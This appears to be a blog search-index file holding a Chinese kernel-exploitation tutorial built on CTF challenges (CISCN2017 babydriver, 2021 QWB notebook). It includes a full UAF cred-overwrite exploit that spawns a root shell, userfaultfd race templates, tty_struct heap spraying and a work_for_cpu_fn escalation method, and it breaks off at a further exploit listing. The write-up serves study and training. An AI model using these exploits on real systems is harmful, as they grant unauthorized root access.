<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>kernel pwn从0到1</title>
    <link href="/2023/01/06/kernel-pwn%E4%BB%8E0%E5%88%B01/"/>
    <url>/2023/01/06/kernel-pwn%E4%BB%8E0%E5%88%B01/</url>
    
    <content type="html"><![CDATA[<h1 id="Linux-kerne-pwn入门（一）"><a href="#Linux-kerne-pwn入门（一）" class="headerlink" title="Linux kerne pwn入门（一）"></a>Linux kerne pwn入门（一）</h1><p>最近在看Linux内核pwn，所以想着写一点东西，以便之后方便复习。<br>作为内核pwn入门的第一篇，基本上是跟着ctf-wiki上的内容在做，加上一点自己的理解。环境搭建方面就不再赘述，网上有很多博客。直接上题。</p><h2 id="kernel-UAF"><a href="#kernel-UAF" class="headerlink" title="kernel UAF"></a>kernel UAF</h2><h3 id="babydriver"><a href="#babydriver" class="headerlink" title="babydriver"></a>babydriver</h3><p>之前用户态的时候也会有很多UAF的情况，可以对照着大概了解一下UAF的原理。这里拿CISCN2017 - babydriver来具体演示一下。<br>首先内核题目一般会给以下三个文件：启动脚本，bzImage 内核启动文件以及cpio根文件系统镜像。我们一般解压cpio根文件系统镜像（Linux直接右键提取到此处就可以了）就可以得到.ko存在漏洞的驱动程序和vmlinux。vmlinux是编译出来原始的内核，未经过压缩，不能直接通过qemu启动，是一个ELF文件，里面包括了符号表等等一系列内核相关的指令，可以用IDA Pro查看，可以找gadget等等等等。类比于libc pwn中的libc-2.23.so之类的，给了这个东西就可以找gadget、找地址偏移等等。bzImage是vmlinux压缩以后，并且加上一段解压启动代码得到。这个东西可以放到QEMU中跑，但是不能用IDA打开。如果题目没有给vmlinux只给了bzImage，可以参考<a href="https://kiprey.github.io/2021/10/kernel_pwn_introduction/#%E5%9B%9B%E3%80%81%E5%B0%8F%E8%AF%95%E7%89%9B%E5%88%80">kiprey师傅</a>用extract-vmlinux工具从bzImage中解压出vmlinux，并用vmlinux-to-elf将符号添加进去。</p><p>我们用IDA分析一下存在漏洞的驱动程序babydriver.ko。首先babydriver_init是加载驱动的初始化程序，所做的工作大概是注册了驱动程序，里面不会存在漏洞（至少到现在做的题里面没有）。babydriver_exit是卸载驱动所做的操作，大概是销毁一写分配的空间。babyopen，babyrelease，babyioctl，babywrite，babyread是通过你写的C程序open(fd),close(fd),ioctl(fd),write(fd),read(fd)所做的操作，举例来说，用fd1&#x3D;open（&#x2F;dev&#x2F;babydriver）打开了一个驱动文件，然后ioctl(fd1)去找fd1所对应的babyioctl操作。</p><p><img src="https://i.imgur.com/8EsrXXB.png"><br>open函数为全局未初始化结构体变量babydev_struct的device_buf分配了大小为64的一段空间（根据kiprey师傅所说kmem_cache_alloc_trace应该是kmalloc函数在IDA下优化的结果），然后将长度赋给device_buf_len结构体成员。</p><p><img src="https://i.imgur.com/vKAKEQh.png"><br>ioctl函数释放掉之前分配的大小为64的空间，并且分配一段大小为用户自定义的空间赋给device_buf,并更新device_buf_len大小(我们用ioctl的格式形如ioctl（fd，command，size），其中size就是v3，因为是rdx寄存器，而又将v3赋给了v4，因此实际上分配的是我们指定的大小)。</p><p><img src="https://i.imgur.com/a07xAWL.png"><br>read函数将内核空间的device_buf处的内容拷贝到用户空间的buffer处</p><p><img src="https://i.imgur.com/Frjit0l.png"><br>write函数将用户空间buffer处的内容拷贝到内核空间device_buf处</p><p><img src="https://i.imgur.com/fufVqHA.png"><br>release函数在关闭这个驱动文件的时候只free而没有将指针置空，因此可能存在UAF</p><p>我们该怎么利用这个UAF漏洞，首先应该打开两遍babydriver驱动，这样fd1和fd2的device_buf均指向内核中同一片内存，因为device_buf是babydriver.ko驱动中的全局变量。然后我们close（fd1），这样就会释放device_buf空间，但指针没有置空，因此我们还可以通过fd2来操控这片内存（因为已经close（fd1），因此不能通过fd1来操控）。那么如何来使用呢，每个进程都会分配一个cred结构体，我们只需要让uid和gid为0就可以达到提权的目的。因此我们需要保证device_buf所在的位置就是为新进程分配的cred结构体所在的位置。我们可以通过ioctl来将fd1指向的device_buf的大小修改为cred结构体大小0xa8，这样在close（fd1）也就是free(device_buf)后fork一个新进程，新进程cred所在的位置就是之前释放device_buf所在的位置（至于为什么会这样，因为还不是太了解内核内存的分配，这里先挖个坑，之后再来补），因为fd2的device_buf此时还指向device_buf也就是cred，因此我们往device_buf处写0覆盖掉uid和gid，就可以让fork出来的新进程为root。</p><figure class="highlight cpp"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></div></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">cred</span> &#123;<br>    <span class="hljs-type">atomic_t</span>    usage;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span><br>    <span class="hljs-type">atomic_t</span>    subscribers;    <span class="hljs-comment">/* number of processes subscribed */</span><br>    <span class="hljs-type">void</span>        *put_addr;<br>    <span class="hljs-type">unsigned</span>    magic;<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CRED_MAGIC  0x43736564</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CRED_MAGIC_DEAD 0x44656144</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    <span class="hljs-type">kuid_t</span>      uid;        <span class="hljs-comment">/* real UID of the task */</span><br>    <span class="hljs-type">kgid_t</span>      gid;        <span class="hljs-comment">/* real GID of the task */</span><br>    <span class="hljs-type">kuid_t</span>      suid;       <span class="hljs-comment">/* saved UID of the task */</span><br>    <span class="hljs-type">kgid_t</span>      sgid;       <span class="hljs-comment">/* saved GID of the task */</span><br>    <span class="hljs-type">kuid_t</span>      euid;       <span class="hljs-comment">/* effective UID of the task */</span><br>    <span class="hljs-type">kgid_t</span>      egid;       <span class="hljs-comment">/* effective GID of the task */</span><br>    <span class="hljs-type">kuid_t</span>      fsuid;      <span class="hljs-comment">/* UID for VFS ops */</span><br>    <span class="hljs-type">kgid_t</span>      fsgid;      <span class="hljs-comment">/* GID for VFS ops */</span><br>    <span class="hljs-type">unsigned</span>    securebits; <span class="hljs-comment">/* SUID-less security management */</span><br>    <span class="hljs-type">kernel_cap_t</span>    cap_inheritable; <span class="hljs-comment">/* caps our children can inherit */</span><br>    <span class="hljs-type">kernel_cap_t</span>    cap_permitted;  <span class="hljs-comment">/* caps we&#x27;re permitted */</span><br>    <span class="hljs-type">kernel_cap_t</span>    cap_effective;  <span class="hljs-comment">/* caps we can actually use */</span><br>    <span class="hljs-type">kernel_cap_t</span>    cap_bset;   <span class="hljs-comment">/* capability bounding set */</span><br>    <span class="hljs-type">kernel_cap_t</span>    cap_ambient;    <span class="hljs-comment">/* Ambient capability set */</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_KEYS</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>   jit_keyring;    <span class="hljs-comment">/* default keyring to attach requested</span><br><span class="hljs-comment">                     * keys to */</span><br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">key</span> __rcu *session_keyring; <span class="hljs-comment">/* keyring inherited over fork */</span><br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">key</span>  *process_keyring; <span class="hljs-comment">/* keyring private to this process */</span><br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">key</span>  *thread_keyring; <span class="hljs-comment">/* keyring private to this thread */</span><br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">key</span>  *request_key_auth; <span class="hljs-comment">/* assumed request_key authority */</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SECURITY</span><br>    <span class="hljs-type">void</span>        *security;  <span class="hljs-comment">/* subjective LSM security */</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">user_struct</span> *user;   <span class="hljs-comment">/* real user ID subscription */</span><br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">user_namespace</span> *user_ns; <span class="hljs-comment">/* user_ns the caps and keyrings are relative to. */</span><br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">group_info</span> *group_info;  <span class="hljs-comment">/* supplementary groups for euid/fsgid */</span><br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">rcu_head</span> rcu;        <span class="hljs-comment">/* RCU deletion hook */</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>exp如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/wait.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-type">int</span> fd1 = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/dev/babydev&quot;</span>, O_RDWR);<br>    <span class="hljs-type">int</span> fd2 = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/dev/babydev&quot;</span>, O_RDWR);<br>    <span class="hljs-built_in">ioctl</span>(fd1, <span class="hljs-number">65537</span>, <span class="hljs-number">0xa8</span>);<br>    <span class="hljs-built_in">close</span>(fd1);<br><br>    <span class="hljs-keyword">if</span>(!fork())&#123;<br>        <span class="hljs-type">char</span> mem[<span class="hljs-number">4</span>*<span class="hljs-number">7</span>];<br>        <span class="hljs-built_in">memset</span>(mem, <span class="hljs-string">&#x27;\x00&#x27;</span>, <span class="hljs-built_in">sizeof</span>(mem));<br>        <span class="hljs-built_in">write</span>(fd2, mem, <span class="hljs-built_in">sizeof</span>(mem));<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] after LPE, privilege: %s\n&quot;</span>, (<span class="hljs-built_in">getuid</span>() ? <span class="hljs-string">&quot;user&quot;</span> : <span class="hljs-string">&quot;root&quot;</span>));<br>        <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-built_in">waitpid</span>(<span class="hljs-number">-1</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>需要注意的是，当进程执行完 fork 操作后，父进程必须 wait 子进程，否则当父进程被销毁后，该进程成为孤儿进程，将无法使用终端进行输入输出。exploit 需要静态编译，因为 kernel 不提供标准库，但一定提供 syscall。</p></blockquote><p>一般内核题目的exp是调用驱动的C文件，我们把他编译进文件系统中，这样就可以用qemu启动内核，然后运行这个c程序getshell。不知道为什么这个题目程序断不下来，因此在下一题中再具体演示内核是如何调试的。</p><h2 id="kernel-ROP"><a href="#kernel-ROP" class="headerlink" title="kernel ROP"></a>kernel ROP</h2><h3 id="2018强网杯core"><a href="#2018强网杯core" class="headerlink" title="2018强网杯core"></a>2018强网杯core</h3><p>内核rop</p><h2 id="userfaultfd的使用"><a href="#userfaultfd的使用" class="headerlink" title="userfaultfd的使用"></a>userfaultfd的使用</h2><p>userfaultfd主要用来在内核pwn中提高条件竞争的成功率，主要来说就是卡在copy_from_user(kptr,user_buf,size)处，因为拷贝时出现了缺页异常，出现缺页异常后就会执行我们注册的handler处理函数，只要我们在这个处理函数中sleep（100）就可以在这个线程中卡住，此时我们如果在另一个线程修改了kptr指向的内存（比如说kfree掉），那么就会出现UAF。怎么才能出现缺页异常呢，可以用mmap分一块匿名内存，第一次访问这个匿名页的时候就会触发缺页异常。</p><blockquote><p>要使用 userfaultfd 系统调用，我们首先要注册一个 userfaultfd，通过 ioctl 监视一块内存区域，同时还需要专门启动一个用以进行轮询的线程 uffd monitor，该线程会通过 poll() 函数不断轮询直到出现缺页异常<br>当有一个线程在这块内存区域内触发缺页异常时（比如说第一次访问一个匿名页），该线程（称之为 faulting 线程）进入到内核中处理缺页异常<br>内核会调用 handle_userfault() 交由 userfaultfd 处理<br>随后 faulting 线程进入堵塞状态，同时将一个 uffd_msg 发送给 monitor 线程，等待其处理结束<br>monitor 线程调用通过 ioctl 处理缺页异常，有如下选项：<br>UFFDIO_COPY：将用户自定义数据拷贝到 faulting page 上<br>UFFDIO_ZEROPAGE ：将 faulting page 置0<br>UFFDIO_WAKE：用于配合上面两项中 UFFDIO_COPY_MODE_DONTWAKE 和 UFFDIO_ZEROPAGE_MODE_DONTWAKE 模式实现批量填充<br>在处理结束后 monitor 线程发送信号唤醒 faulting 线程继续工作</p></blockquote><p>据<a href="https://blog.csdn.net/qq_54218833/article/details/126004590">L3H_CoLin师傅</a>说在Linux5.4版本以下的内核中这种方法是可行的，新版本只有root权限才有权执行此类操作。一般做题时我们直接套板子就好了。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-type">static</span> <span class="hljs-type">pthread_t</span> monitor_thread;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">errExit</span><span class="hljs-params">(<span class="hljs-type">char</span> * msg)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">registerUserFaultFd</span><span class="hljs-params">(<span class="hljs-type">void</span> * addr, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> len, <span class="hljs-type">void</span> (*handler)(<span class="hljs-type">void</span>*))</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">long</span> uffd;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">uffdio_api</span> uffdio_api;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">uffdio_register</span> uffdio_register;<br>    <span class="hljs-type">int</span> s;<br><br>    <span class="hljs-comment">/* Create and enable userfaultfd object */</span><br>    uffd = <span class="hljs-built_in">syscall</span>(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);<br>    <span class="hljs-keyword">if</span> (uffd == <span class="hljs-number">-1</span>)<br>        <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;userfaultfd&quot;</span>);<br><br>    uffdio_api.api = UFFD_API;<br>    uffdio_api.features = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">ioctl</span>(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="hljs-number">-1</span>)<br>        <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;ioctl-UFFDIO_API&quot;</span>);<br><br>    uffdio_register.range.start = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) addr;<br>    uffdio_register.range.len = len;<br>    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">ioctl</span>(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="hljs-number">-1</span>)<br>        <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;ioctl-UFFDIO_REGISTER&quot;</span>);<br><br>    s = <span class="hljs-built_in">pthread_create</span>(&amp;monitor_thread, <span class="hljs-literal">NULL</span>, handler, (<span class="hljs-type">void</span> *) uffd);<br>    <span class="hljs-keyword">if</span> (s != <span class="hljs-number">0</span>)<br>        <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;pthread_create&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>在使用时直接调用即可</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">register<span class="hljs-constructor">UserFaultFd(<span class="hljs-params">addr</span>, <span class="hljs-params">len</span>, <span class="hljs-params">handler</span>)</span>;<br></code></pre></td></tr></table></figure><p>handler的板子：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-type">static</span> <span class="hljs-type">char</span> *page = <span class="hljs-literal">NULL</span>; <span class="hljs-comment">// 你要拷贝进去的数据</span><br><span class="hljs-type">static</span> <span class="hljs-type">long</span> page_size;<br><br><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span> *</span><br><span class="hljs-function"><span class="hljs-title">fault_handler_thread</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">uffd_msg</span> msg;<br>    <span class="hljs-type">static</span> <span class="hljs-type">int</span> fault_cnt = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">long</span> uffd;<br><br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">uffdio_copy</span> uffdio_copy;<br>    <span class="hljs-type">ssize_t</span> nread;<br><br>    uffd = (<span class="hljs-type">long</span>) arg;<br><br>    <span class="hljs-keyword">for</span> (;;) <br>    &#123;<br>        <span class="hljs-keyword">struct</span> <span class="hljs-title class_">pollfd</span> pollfd;<br>        <span class="hljs-type">int</span> nready;<br>        pollfd.fd = uffd;<br>        pollfd.events = POLLIN;<br>        nready = <span class="hljs-built_in">poll</span>(&amp;pollfd, <span class="hljs-number">1</span>, <span class="hljs-number">-1</span>);<br><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">         * [在这停顿.jpg]</span><br><span class="hljs-comment">         * 当 poll 返回时说明出现了缺页异常</span><br><span class="hljs-comment">         * 你可以在这里插入一些自定义的代码，比如说获取锁或者 sleep() 一类的操作</span><br><span class="hljs-comment">         * 让他在你想要的地方停顿，之后你再手动唤醒（或者就这样卡住）</span><br><span class="hljs-comment">         */</span><br><br>        <span class="hljs-keyword">if</span> (nready == <span class="hljs-number">-1</span>)<br>            <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;poll&quot;</span>);<br><br>        nread = <span class="hljs-built_in">read</span>(uffd, &amp;msg, <span class="hljs-built_in">sizeof</span>(msg));<br><br>        <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">0</span>)<br>            <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;EOF on userfaultfd!\n&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">-1</span>)<br>            <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;read&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)<br>            <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;Unexpected event on userfaultfd\n&quot;</span>);<br><br>        uffdio_copy.src = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) page;<br>        uffdio_copy.dst = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) msg.arg.pagefault.address &amp;<br>                                              ~(page_size - <span class="hljs-number">1</span>);<br>        uffdio_copy.len = page_size;<br>        uffdio_copy.mode = <span class="hljs-number">0</span>;<br>        uffdio_copy.copy = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">ioctl</span>(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="hljs-number">-1</span>)<br>            <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;ioctl-UFFDIO_COPY&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="从2021强网杯notebook学userfaultfd和堆喷"><a href="#从2021强网杯notebook学userfaultfd和堆喷" class="headerlink" title="从2021强网杯notebook学userfaultfd和堆喷"></a>从2021强网杯notebook学userfaultfd和堆喷</h2><p>查看启动脚本发现开启了smap，smep和kaslr保护。并且开启了KPTI保护。</p><blockquote><p>过KPTI保护就可以不用过smep和smap保护，不知道为什么，这里留个坑，下次再来解释。</p></blockquote><p><img src="https://i.imgur.com/aLdZ5Jr.png"></p><h4 id="主要思路"><a href="#主要思路" class="headerlink" title="主要思路"></a><strong>主要思路</strong></h4><p>这道题的主要思路就是UAF，free掉notebook.note,但是我们还可以通过notebook.note去访问这个指针，这个过程需要用到线程竞争，为了提高竞争的成功率就要用到userfaultfd机制。释放的notebook.note的大小应该是tty_struct的大小，这样我们多次open(“&#x2F;dev&#x2F;ptmx”),就有概率申请的tty_struct被放在刚刚释放的大小为tty_struct的notebook.note中，这样通过访问notebook.note就可以UAF修改tty_struct的值从而劫持控制流bypass KPTI到用户空间拿到root权限并getshell。我们多次打开dev&#x2F;ptmx的过程就叫堆喷。</p><blockquote><p>堆喷的原理可以这样简单理解：假设我们有一个大小n的内核pool chunk A，然后释放该chunk。当我们再次申请同样大小的chunk时，就有可能又会申请到A，只是概率较低，但是如果我们大量申请同样大小的chunk，就有很大的概率又申请到A空间。</p></blockquote><p>我们可以看到noteedit中用krealloc函数，会先释放原有空间，再分配新的空间，这里我们原有空间的大小可以设为0x2e0，也就是tty_struct的大小，然后传入的newsize可以是0x1000，传入的buf可以是memset分配的匿名页，这样在copy_from_user的时候就会sleep一段时间，此时还没有修改notebook.note的指向，因此访问notebook.note还可以访问到原来的指针。<br><img src="https://i.imgur.com/BEMW0pE.png"></p><p>此时大小为0x2e0大小的堆空间已经释放了，因此此时我们多次申请open(“&#x2F;dev&#x2F;ptmx”),这样就能有大概率申请到的tty_struct刚好就落在刚刚释放的堆空间里。</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs llvm">for (int i <span class="hljs-operator">=</span> <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; 0x80; i++)</span><br>        tty_fd[i] <span class="hljs-operator">=</span> open(<span class="hljs-string">&quot;/dev/ptmx&quot;</span><span class="hljs-punctuation">,</span> O_RDWR | O_NOCTTY)<span class="hljs-comment">;</span><br>    puts(<span class="hljs-string">&quot;<span class="hljs-char escape_">\03</span>3[32m<span class="hljs-char escape_">\03</span>3[1m[+] Heap spray for tty done.<span class="hljs-char escape_">\03</span>3[0m&quot;</span>)<span class="hljs-comment">;</span><br>    sleep(<span class="hljs-number">1</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>接下来我们要把每个notebook.note里的数据读到用户空间然后判断是哪一个notebook.note hit到了tty_struct，但是在读的时候会有检查size，不能越界读写，因此我们还需要另起一个线程去修改notebook的size为正常大小。因为是add和edit都是读锁，因此可以多线程访问，不会阻塞。<br><img src="https://i.imgur.com/bH09Rsa.png"></p><p>然后就是常规的劫持tty_operations执行ROP。当时我看其他师傅的脚本栈迁移迁移的我犯迷糊，因此推荐<a href="https://zhuanlan.zhihu.com/p/385645268">长亭的wp</a>。前面的解法相同，只是后面不需要那么多次栈迁移以及ROP。</p><h4 id="work-for-cpu-fn-稳定化利用"><a href="#work-for-cpu-fn-稳定化利用" class="headerlink" title="work_for_cpu_fn 稳定化利用"></a>work_for_cpu_fn 稳定化利用</h4><p>在开启了多核支持的内核中都有这个函数，定义于 kernel&#x2F;workqueue.c 中：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-keyword">struct</span> work_for_cpu &#123;<br>    <span class="hljs-keyword">struct</span> work_struct work;<br>    <span class="hljs-built_in">long</span> (*fn)(<span class="hljs-keyword">void</span> *);<br>    <span class="hljs-keyword">void</span> *arg;<br>    <span class="hljs-built_in">long</span> ret;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">work_for_cpu_fn</span>(<span class="hljs-params"><span class="hljs-keyword">struct</span> work_struct *work</span>)</span><br>&#123;<br>    <span class="hljs-keyword">struct</span> work_for_cpu *wfc = container_of(work, <span class="hljs-keyword">struct</span> work_for_cpu, work);<br><br>    wfc-&gt;ret = wfc-&gt;fn(wfc-&gt;arg);<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到这个函数 rdi + 0x20 处作为函数指针执行，参数为 rdi + 0x28 处值，返回值存放在 rdi + 0x30 处，由此我们可以很方便地分次执行 prepare_kernel_cred 和 commit_creds，完成稳定化提权。</p><blockquote><p>这里劫持ioctl而不是write，原因是 tty_write 和 do_tty_write 操作中对此处的成员变量进行了操作，会修改rdi+0x28处的值，所以劫持ioctl。并且ctf-wiki上说ioctl的cmd值最好用233.</p></blockquote><p>而在执行ioctl的时候，rdi寄存器的值刚好是tty_struct的值，因此在（size_t）tty_struct+3的位置也就是operations的位置填入work_for_cpu_fn函数地址，然后在（size_t）tty_struct+4也就是rdi+0x20的位置填入prepare_kernel_cred函数的地址，在（size_t）tty_struct+5也就是rdi+0x28的位置填入0，也就是prepare_kernel_cred的参数，返回值放在（size_t）tty_struct+6的位置。然后调用ioctl执行prepare_kernel_cred函数，执行完后将返回值也就是（size_t）tty_struct+6的位置放入（size_t）tty_struct+5也就是参数的位置，然后（size_t）tty_struct+3的位置填入work_for_cpu_fn函数地址，然后在（size_t）tty_struct+4的位置填入commit_creds函数的地址。之后直接用户态getshell即可。</p><p><strong>解法一exp</strong></p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 